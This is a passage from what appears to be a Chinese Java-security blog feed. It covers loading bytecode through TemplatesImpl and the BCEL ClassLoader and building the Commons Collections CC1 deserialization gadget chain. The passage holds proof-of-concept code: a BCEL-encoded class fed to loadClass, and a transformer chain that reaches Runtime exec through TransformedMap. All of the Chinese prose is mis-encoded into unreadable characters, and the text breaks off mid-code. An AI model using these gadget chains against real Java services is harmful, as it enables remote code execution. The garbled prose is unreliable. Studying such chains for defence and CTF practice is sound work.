System.out.println(<span class="hljs-string">&quot;Hello TemplatesImpl&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®ƒç»§æ‰¿äº† <code>AbstractTranslet</code> ç±»ï¼Œå¹¶åœ¨æ„é€ å‡½æ•°é‡Œæ’å…¥<code>Hello</code>çš„è¾“å‡ºã€‚</p><p>å°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç ï¼Œå³å¯è¢« <code>TemplatesImpl</code> æ‰§è¡Œäº†ï¼š</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730005336767.png" alt="image-20240730005336767"></p><h2 id="åˆ©ç”¨BCEL-ClassLoaderåŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨BCEL-ClassLoaderåŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨BCEL ClassLoaderåŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨BCEL ClassLoaderåŠ è½½å­—èŠ‚ç </h2><p>è‹¥æˆ‘ä»¬è®¤ä¸ºæ‰€æœ‰èƒ½å¤Ÿæ¢å¤æˆä¸€ä¸ªç±»å¹¶åœ¨JVMè™šæ‹Ÿæœºé‡ŒåŠ è½½çš„å­—èŠ‚åºåˆ—éƒ½åœ¨æˆ‘ä»¬çš„æ¢è®¨èŒƒå›´å†…ã€‚ </p><p>é‚£ä¹ˆï¼Œ<strong>BCELå­—èŠ‚ç </strong>ä¹Ÿå¿…ç„¶åœ¨æˆ‘ä»¬çš„è®¨è®ºèŒƒå›´å†…ï¼Œä¸”å æ®ç€æ¯”è¾ƒé‡è¦çš„åœ°ä½ã€‚ </p><p><code>BCEL</code>çš„å…¨ååº”è¯¥æ˜¯<code>Apache Commons BCEL</code>ï¼Œå±äº<code>Apache Commons</code>é¡¹ç›®ä¸‹çš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œ</p><p>ä½†å…¶å› ä¸ºè¢«<code>Apache Xalan</code>æ‰€ä½¿ç”¨ï¼Œè€Œ<code>Apache Xalan</code>åˆæ˜¯Javaå†…éƒ¨å¯¹äºJAXPçš„å®ç°ï¼Œæ‰€ä»¥BCELä¹Ÿè¢«åŒ…å«åœ¨äº†JDKçš„åŸç”Ÿåº“ä¸­ã€‚ </p><p>å…³äºBCELçš„è¯¦ç»†ä»‹ç»ï¼Œè¯·é˜…è¯»pç‰›å†™çš„å¦ä¸€ç¯‡æ–‡ç« ã€Š<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader</a>å»å“ªäº†ã€‹ï¼Œå»ºè®®é˜…è¯»å®Œè¿™ç¯‡æ–‡ç« å†æ¥é˜…è¯»ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡BCELæä¾›çš„ä¸¤ä¸ªç±»<code>Repository</code>å’Œ<code>Utility</code>æ¥åˆ©ç”¨ï¼š</p><p><code>Repository</code>ç”¨äºå°†ä¸€ä¸ª<code>Java Class</code>å…ˆè½¬æ¢æˆåŸç”Ÿå­—èŠ‚ç ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨<code>javac</code>å‘½ä»¤æ¥ç¼–è¯‘javaæ–‡ä»¶ç”Ÿæˆå­—èŠ‚ç ï¼›</p><p><code>Utility</code>ç”¨äºå°†åŸç”Ÿçš„å­—èŠ‚ç è½¬æ¢æˆBCELæ ¼å¼çš„å­—èŠ‚ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloBCEL</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String []args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(evil.Hello.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730005943078.png" alt="image-20240730005943078"></p><p>å‰é¢åŠ ä¸ª<code>$$BCEL$$</code>æ ‡è¯†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloBCEL</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String []args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//encode();</span><br>        decode();<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">encode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(evil.Hello.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">decode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>().loadClass<br>                (<span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMK$c3$40$Q$7d$db$af41$b5$b5$b5$f5$5b$5bOU$c4$5c$E$P$V$_$82x$I$wT$ea$c1$d3$b6$5d$ea$96M$oiZ$f0g$e9A$c1$83$3f$c0$l$r$cen$LA$e8$k$e61of$de$be$d9$fd$f9$fd$fa$Gp$86C$H$F$ac$db$a8$a3Q$c4$86$83MlY$d8$b6$b0$c3P$b8$90$a1L$$$Z$b2$ed$a3$kC$ee$w$g$K$86$b2$_Cq$3b$N$fa$o$7e$e0$7dEL$d5$8f$G$5c$f5x$yu$be$ms$c9$b3$9c0$b8$be$98I$e5$dd$I$a5$a2$O$b1$B$97$nC$a3$fd$e4$8f$f9$8c$7b$8a$87$p$af$9b$c42$iu$cc$j$3c$k$d1T&quot;</span> +                <span class="hljs-string">&quot;mI$99$c1$e9F$d3x$m$ae$a5$d6w$8c$e4$a9nsa$a1ha$d7$c5$k$f6$ZJ$a6r$d2$7c$8cb5lY8p$d1D$8b$sR$t$&quot;</span> +              <span class="hljs-string">&quot;M$95T$ff$ae$3f$W$83$e4$l$d5$7d$9d$q$o$a0$c5$a3$v$V$eas32$f2$ee$c9IB$7e$E$P$c8Om$J$cd$60$bd$e8L$d1$96$f5$f6$b2$r$d1B$9e$9e$5c$9f$M$98$b6N$d1$a6$cc$pd$84$f9$e3O$b07Sv$u$W$M$99&quot;</span> +          <span class="hljs-string">&quot;$c5$KEw$de$40X$o$b4$b1$8a$f2b$f8$dc$88$R$f7$8eL5$fb$81$5c$w$e0$Q$ea$a1$oI$a5$o6$wX$p$a4$ef3$9d&quot;</span> + <span class="hljs-string">&quot;$b5$3f3$dbS$w$S$C$A$A&quot;</span>).newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730011732779.png" alt="image-20240730011732779"></p><p><code>BCEL ClassLoader</code>åœ¨<code>Fastjson</code>ç­‰æ¼æ´çš„åˆ©ç”¨é“¾æ„é€ æ—¶éƒ½æœ‰è¢«ç”¨åˆ°ï¼Œå…¶å®è¿™ä¸ªç±»å’Œå‰é¢çš„ <code>TemplatesImpl</code> éƒ½å‡ºè‡ªäºåŒä¸€ä¸ªç¬¬ä¸‰æ–¹åº“ï¼Œ<code>Apache Xalan</code>ã€‚</p><p>ä½†æ˜¯ç”±äºå„ç§åŸå› ï¼ˆè¯¦è§å‰é¢æ‰€è¯´çš„ ã€ŠBCEL ClassLoader å»å“ªäº†ã€‹ï¼‰ï¼Œåœ¨<strong>Java <code>8u251</code>çš„æ›´æ–°ä¸­ï¼Œè¿™ä¸ªClassLoaderè¢«ç§»é™¤äº†</strong>ï¼Œæ‰€ä»¥æˆ‘JDK8u401çš„ç‰ˆæœ¬æ˜¯ä¼šæŠ¥é”™çš„ï¼š</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730011841209.png" alt="image-20240730011841209"></p><p>ä½†æ˜¯è¿™ç§ä½¿ç”¨<code>Repository.lookupClass()</code>çš„æ–¹æ³•å¾ˆå¸¸ç”¨ï¼Œç»å¸¸ç”¨äºæ‰“å…¥æ¶æ„å­—èŠ‚ç ï¼Œåç»­é‡åˆ°å…·ä½“é¢˜ç›®çš„æ—¶å€™å°±çŸ¥é“äº†ã€‚æ‰“å¤ç°çš„æ—¶å€™è¿™å‡ ä¸ªåŠ è½½å­—èŠ‚ç çš„æ–¹å¼éƒ½å¯èƒ½ä¼šå‡ºç°ã€‚</p><p>å‚è€ƒï¼š</p><p>pç‰›-Javaå®‰å…¨æ¼«è°ˆ - 13.Javaä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„é‚£äº›æ–¹æ³•</p><p><a href="https://wx.zsxq.com/dweb2/index/tags/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/551511412514">çŸ¥è¯†æ˜Ÿçƒ | æ·±åº¦è¿æ¥é“æ†ç²‰ä¸ï¼Œè¿è¥é«˜å“è´¨ç¤¾ç¾¤ï¼ŒçŸ¥è¯†å˜ç°çš„å·¥å…· (zsxq.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Commons Collections</title>
    <link href="/2024/07/28/Commons-Collections/"/>
    <url>/2024/07/28/Commons-Collections/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å½“åˆå­¦Javaååºåˆ—åŒ–æœ€å…ˆé‡åˆ°çš„ï¼Œè¿™ä¹Ÿæ˜¯ç»•ä¸å¼€çš„ä¸œè¥¿ã€‚è™½ç„¶ç°åœ¨å¯¹äºå¾ˆå¤šJavaååºåˆ—åŒ–é¢˜å·²ç»ä¸èƒ½ç›´æ¥å¥—ç”¨CCé“¾é€Ÿé€šï¼Œä½†æ˜¯å¾ˆå¤šç¼åˆæ€ªè°ƒè¯•åˆ°æœ€åä¸€æ­¥è¿˜æ˜¯é‡‡ç”¨çš„CCé“¾éƒ¨åˆ†ï¼Œå› ä¸ºåŸç”Ÿååºåˆ—åŒ–è‚¯å®šæ˜¯å¾ˆå¥½ç”¨çš„ã€‚</p><p>é¦–å…ˆç®€å•ä»‹ç»ä¸€ä¸‹å‡ ä¸ªå…³é”®è¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">å¯¹äºåˆ©ç”¨é“¾ä¸Šçš„ç±»ï¼Œéƒ½éœ€è¦å®ç°Serializableæ¥å£ã€æˆ–ç»§æ‰¿è¯¥æ¥å£çš„å®ç°ç±»<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Sourceï¼šå…¥å£ç±»ï¼ˆé‡å†™readObjectè°ƒç”¨å¸¸è§æ–¹æ³•ï¼Œå‚æ•°ç±»å‹å®½æ³›ï¼Œæœ€å¥½jdkè‡ªå¸¦ï¼‰<br>Gadget Chainï¼šè°ƒç”¨é“¾ï¼ˆç›¸åŒæ–¹æ³•åã€ç›¸åŒå‚æ•°ç±»å‹ã€ä¸åŒè°ƒç”¨è¿‡ç¨‹ï¼‰<br>Sinkï¼šæ‰§è¡Œç±»ï¼ˆRCEã€SSRFã€å†™æ–‡ä»¶...ï¼‰<br></code></pre></td></tr></table></figure><p>å¸¸è§æ–¹æ³•ï¼š<code>toString</code>ã€<code>hashCode</code>ã€<code>equals</code></p><p>åœ¨åé¢çš„CCé“¾ä¸­ç»å¸¸çœ‹åˆ°<code>HashMap</code>ä½œä¸ºå…¥å£ç±»ï¼Œå®ƒå®ç°äº†<code>Serializable</code>æ¥å£ä¸”ä½œä¸ºjdkè‡ªå¸¦çš„ç±»ï¼Œ<code>readObject</code>ä¸­è°ƒç”¨äº†å¸¸è§æ–¹æ³•<code>hashCode</code>ï¼Œæ˜¯ä¸é”™çš„å…¥å£ç±»ã€‚</p><p>ä¸¥æ ¼æ¥è¯´åº”è¯¥ä»URLDNSå¼€å§‹å†™ï¼Œä½†æ˜¯åŸç†ä¹Ÿå¾ˆç®€å•å¾ˆæ˜“æ‡‚ï¼Œåªæ¶‰åŠURLç±»é‡Œhashcodeé‡Œçš„ç®€å•æ“ä½œè§¦å‘è®¿é—®DNSï¼ˆå…¶å®æ˜¯æˆ‘æ‡’ï¼‰ï¼Œå°±ä¸å†™äº†ã€‚</p><p>è¯ä¸å¤šè¯´ï¼Œç›´æ¥å›åˆ°æˆ‘ä»¬æ¢¦å¼€å§‹çš„åœ°æ–¹-<strong>Commons Collections</strong>ã€‚</p><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>CC1å…¶å®ç”¨çš„ä¸å¤šï¼ŒCCé“¾é‡Œç”¨å¾—é¢‘ç¹çš„å…¶å®æ˜¯CC3ï¼ˆæ¶æ„å­—èŠ‚ç ï¼‰ã€CC6ä»¥åŠCC4ï¼Œè¿˜æœ‰å¾ˆå°‘è§çš„CC2ï¼ŒCC1å…¶å®å°±æ˜¯èµ·åˆ°ä¸€ä¸ªå¼•å…¥å­¦ä¹ çš„ä½œç”¨ã€‚</p><p>é¦–å…ˆä¾èµ–å°±ç›´æ¥</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œæˆ‘ç”¨çš„æ˜¯<code>Jdk8u401</code>ã€‚</p><p>è¿™å‡ ä¸ªMapéƒ½å°¤ä¸ºç»å…¸ï¼Œéœ€è¦æ·±å…¥å­¦ä¹ ã€‚</p><p><strong>Transformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> &#123;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>Transformer</code>æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå¯ä»¥æ¥å—ä»»æ„ä¸€ä¸ª<code>Object</code>ç±»å‹çš„å‚æ•°ä¼ å…¥ã€‚è¿™ä¸ªæ¥å£æœ‰å‡ ä¸ªé‡è¦çš„Mapå®ç°ç±»ï¼Œè€Œä¸”å®ƒä»¬éƒ½å®ç°äº†<code>Serializable</code>æ¥å£ã€‚</p><p><strong>ConstantTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstantTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object iConstant;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iConstant = constantToReturn;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">return</span> iConstant;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ<code>ConstantTransformer</code>è°ƒç”¨<code>transform()</code>æ–¹æ³•è¿”å›æ„é€ æ—¶ä¼ å…¥çš„å¯¹è±¡</p><p>å†™ä¸€å †ç©æ„å…¶å®å°±æ˜¯ä¼ å…¥ä¼ å‡ºä¸€ä¸ªå¯¹è±¡ï¼Œå‰åä¸å˜ã€‚</p><p><strong>InvokerTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>        &#125; <span class="hljs-comment">// catch ....</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå°±æ¯”è¾ƒå…³é”®äº†ï¼Œæ˜¯ååºåˆ—åŒ–åˆ©ç”¨çš„å¸¸å®¢ã€‚å› ä¸ºå®ƒè¿™é‡Œçš„invokeå¯ä»¥æ‰§è¡Œä»»æ„æ–¹æ³•ã€‚</p><ul><li>iMethodName å¾…æ‰§è¡Œçš„æ–¹æ³•å</li><li>iParamTypes å¾…æ‰§è¡Œæ–¹æ³•çš„å‚æ•°åˆ—è¡¨çš„å‚æ•°ç±»å‹</li><li>iArgs å¾…æ‰§è¡Œæ–¹æ³•çš„å‚æ•°åˆ—è¡¨</li></ul><p>è°ƒç”¨<code>transform</code>çš„æ—¶å€™ä¼šæ‰§è¡Œinputå¯¹è±¡çš„iMethodNameæ–¹æ³•ã€‚</p><p><strong>ChainedTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChainedTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™ä¸€å †ï¼Œå…¶å®å°±æ˜¯æŠŠå¤šä¸ª<code>Transformer</code>ä¸²æˆä¸€æ¡é“¾å­ï¼Œå‰ä¸€ä¸ªè°ƒç”¨è¿”å›çš„ç»“æœä½œä¸ºåä¸€ä¸ªè°ƒç”¨çš„å‚æ•°ã€‚</p><p><strong>TransformedMap</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMap</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>TransformedMap</code>ç”¨äºå¯¹JavaåŸç”ŸMapè¿›è¡Œä¸€äº›ä¿®é¥°ï¼Œå½“Mapè°ƒç”¨<code>setValue</code>æ—¶ï¼Œä¼šè§¦å‘<code>checkSetValue</code>ï¼Œè¿›è€Œè°ƒç”¨<code>transform</code>ã€‚å…¶æ„é€ æ–¹æ³•è¢«<code>protected</code>ä¿®é¥°ï¼Œå› æ­¤æˆ‘ä»¬åˆ©ç”¨å®ƒçš„é™æ€publicæ–¹æ³•<code>decorate</code></p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>é¦–å…ˆæˆ‘ä»¬æƒ³åˆ°çš„æ˜¯ä½¿ç”¨<code>Transformer</code>çš„å®ç°ç±»å’Œ<code>TransformedMap</code>å®ç°å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>Map&lt;Object, Object&gt; evilMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>evilMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-number">114514</span>);<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œæœ‰ä¿©é—®é¢˜ï¼š</p><ul><li>Runtimeç±»æ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£ï¼Œæ— æ³•ååºåˆ—åŒ–</li><li>éœ€è¦æ‰¾åˆ°<code>readObject</code>ä¸­æœ‰ç±»ä¼¼<code>Map.put(xxx,yyy)</code>æ“ä½œçš„ç±»</li></ul><p>å¯¹äºé—®é¢˜ä¸€ï¼Œ<code>Class</code>ç±»å¯ä»¥ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨<code>Runtime.class</code>ä½œä¸º<code>ChainedTransformer</code>çš„å…¥å£å‚æ•°ï¼Œåé¢å†é€šè¿‡åå°„æ¥è°ƒç”¨exec</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title 